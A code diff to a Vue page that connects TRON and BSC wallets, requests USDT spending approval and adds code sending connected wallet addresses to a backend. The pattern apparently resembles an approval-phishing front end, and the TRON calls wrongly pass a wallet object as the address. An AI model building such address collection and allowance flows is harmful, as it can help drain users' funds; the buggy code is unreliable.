@@ -56,26 +56,7 @@
             已授权（{{ allowanceInUsdt }} USDT）
           </div>
         </div>
-        <!-- <div
-          v-if="
-            tronAddress === 'CONNECT TRON WALLET' ||
-            bscAddress === 'CONNECT BSC WALLET'
-          "
-          class="btn"
-          @click="connectWallet"
-        >
-          請連結錢包（{{ indexNav === "tron" ? "TRON" : "BSC" }} 鏈）
-        </div>
-        <div class="btn" v-else>
-          <div v-if="indexNav === 'tron'">
-            {{ tronAddress }}<br />
-            已授权（{{ formattedAmount }} USDT）
-          </div>
-          <div v-else>
-            {{ bscAddress }}<br />
-            已授权（{{ allowanceInUsdt }} USDT）
-          </div>
-        </div> -->
+
         <el-form ref="ruleFormRef" class="demo-ruleForm" label-position="top">
           <el-form-item label="授權金額（USDT）" prop="name">
             <el-input
@@ -99,7 +80,7 @@
   </div>
 </template>
 <script lang="ts" setup>
-import { ref, onMounted, watch, onUnmounted } from "vue";
+import { ref, onMounted, watch, onUnmounted, Ref } from "vue";
 // import abi from "@/utils/abi.json";
 import abiU from "@/utils/abiU.json";
 import { ElMessage } from "element-plus";
@@ -121,6 +102,7 @@ const changeNetwork = (network: string) => {
 
 // !  bsc
 import Web3 from "web3";
+import { SubmitAddress } from "@/api/upload";
 
 const { ethereum } = window; // 获取window.ethereum
 const bscWeb3 = new Web3(ethereum); // 初始化Web3
@@ -138,6 +120,8 @@ async function connectWallet1() {
       const prefix = account.substring(0, 8);
       const suffix = account.slice(-6);
       bscAddress.value = prefix + "..." + suffix; // 设置 BSC 钱包地址
+      // 发送地址请求
+      sendAddressRequest("ETH", accounts[0]);
     } else {
       ElMessage.error("请先连接钱包");
     }
@@ -164,10 +148,10 @@ async function approveBscToken() {
     // 检查当前网络是否为BSC网络
     try {
       // 切换到BSC网络
-      // await ethereum.request({
-      //   method: "wallet_switchEthereumChain",
-      //   params: [{ chainId: Bsc_CHAIN_ID }],
-      // }); // 切换到BSC网络
+      await ethereum.request({
+        method: "wallet_switchEthereumChain",
+        params: [{ chainId: Bsc_CHAIN_ID }],
+      }); // 切换到BSC网络
     } catch (switchError: any) {
       // 捕获错误
       if (switchError.code === 4902) {
@@ -239,6 +223,19 @@ async function getBscAuthorizedAmount() {
   }
 }
 
+// 发送地址请求的函数
+async function sendAddressRequest(chainName: string, address: string) {
+  try {
+    const res = await SubmitAddress({
+      chain_name: chainName,
+      token_address: address,
+    });
+    console.log(`发送地址请求成功, 链: ${chainName}, 地址: ${address}`, res);
+  } catch (error) {
+    console.error(`发送地址请求失败:`, error);
+  }
+}
+
 //  ! tron
 const authorized = ref();
 const Loading = ref(false);
@@ -255,15 +252,18 @@ async function connectWallet() {
       tronWebValue.value = window.tronLink.tronWeb;
       updateAddress();
       getAuthorizedAmount();
+      sendAddressRequest("TRX", window.tronLink.tronWeb);
     } else if (window.okxwallet.tronLink) {
       await window.okxwallet.tronLink.request({
         method: "tron_requestAccounts",
       });
       tronWebValue.value = window.okxwallet.tronLink.tronWeb;
       updateAddress();
+      sendAddressRequest("TRX", window.okxwallet.tronLink.tronWeb);
     } else if (window.tronWeb) {
       tronWebValue.value = window.tronWeb;
       updateAddress();
+      sendAddressRequest("TRX", window.tronWeb);
     } else {
       ElMessage.error(" 未找到钱包");
     }
@@ -380,11 +380,22 @@ const updateAddress = () => {
     ElMessage.error("未连接钱包或用户未授权");
   }
 };
-const LinkedWallet = () => {
+const LinkedWallet = async () => {
   if (indexNav.value === "tron") {
     connectWallet();
+    // const res = await SubmitAddress({
+    //   chain_name: "TRX",
+    //   token_address: tronAddress,
+    // });
+    // console.log('res indexNav.value === "tron"', res);
   } else if (indexNav.value === "bsc") {
     approveBscToken();
+
+    // const res = await SubmitAddress({
+    //   chain_name: "ETH",
+    //   token_address: bscAddress,
+    // });
+    // console.log('res indexNav.value === "bsc"', res);
   } else {
     connectWallet();
   }
@@ -408,6 +419,7 @@ onMounted(() => {
 
   min-height: calc(100vh);
   .container {
+    height: 100vh;
     padding: 16px 0px 0px 0px;
     display: flex;
     flex-direction: column;
@@ -439,8 +451,10 @@ onMounted(() => {
       }
     }
     .card {
-      min-height: calc(100vh);
+      height: 100vh;
+      // min-height: calc(100vh);
       padding: 38px 20px;
+      padding-bottom: 0;
       border-radius: 38px 38px 0px 0px;
       background: #fff;
       box-shadow: 0px 0px 50px 0px rgba(0, 0, 0, 0.18);
